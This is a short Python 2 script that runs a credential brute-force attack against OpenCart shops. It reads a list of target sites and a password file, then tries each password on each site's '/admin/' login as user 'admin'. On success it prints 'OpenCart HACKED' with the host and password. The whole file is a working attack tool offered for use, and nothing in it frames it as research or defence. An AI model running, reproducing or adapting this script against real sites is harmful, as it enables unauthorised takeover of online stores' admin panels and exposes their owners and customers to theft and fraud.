import urllib
import urllib2
import cookielib
import re
oclisto= open("list.txt","r")
passwordso  = open("pass.txt","r")
oclist = []
passwords = []
for it in oclisto :
    it = it.rstrip()
    oclist.append(it)
for it in passwordso :
    it = it.rstrip()
    passwords.append(it)
def bruteoc(siteh,passs):
            try :
                     cookie_jar = cookielib.CookieJar() 
                     login_form_seq = [ 
                     ('username', 'admin'), 
                     ('password', passs)] 
                     login_form_data = urllib.urlencode(login_form_seq) 
                     opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar)) 
                     site = opener.open(siteh + "/admin/", login_form_data).read() 
                     if re.search('type="password"',site): 
                            logged = False
                     else :
                            print ( "    OpenCart HACKED  Host :  " + str(siteh) + " Username :  admin  Password : " + str(passs))
            except :
                    pass
def attackoc():
    for oc in oclist :
	    for passs in passwords :
                        print "Attacking : " + str(oc) + " admin : " + str(passs)
		        bruteoc(oc,passs)
attackoc()